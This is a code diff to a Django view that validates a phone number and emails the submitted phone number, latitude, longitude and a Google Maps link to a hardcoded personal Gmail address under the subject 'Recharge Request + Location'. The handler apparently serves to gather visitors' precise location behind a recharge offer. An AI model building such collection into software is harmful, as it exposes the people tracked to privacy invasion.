@@ -2,6 +2,7 @@ from django.shortcuts import render
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 import json
+import re
 from django.core.mail import send_mail
 
 def home(request):
@@ -21,10 +22,16 @@ def save_location(request):
 
             location_text = f"Latitude: {latitude}, Longitude: {longitude}" if latitude and longitude else "Location not provided"
 
+            # Validate phone number (must be 10 digits)
+            if not re.fullmatch(r"\d{10}", phone):
+                return JsonResponse({"error": "Invalid phone number. Enter a 10-digit number."}, status=400)
+
+            # Google Maps link
+            google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
+
             # Email content
             subject = "Recharge Request + Location"
-            message = f"Phone: {phone}\nLocation: {location_text}"
-
+            message = f"Phone: {phone}\nLocation: {latitude}, {longitude}\nGoogle Maps: {google_maps_link}"
             send_mail(
                 subject, message, "swapeatmail@gmail.com", ["piyushphysics834@gmail.com"]
             )
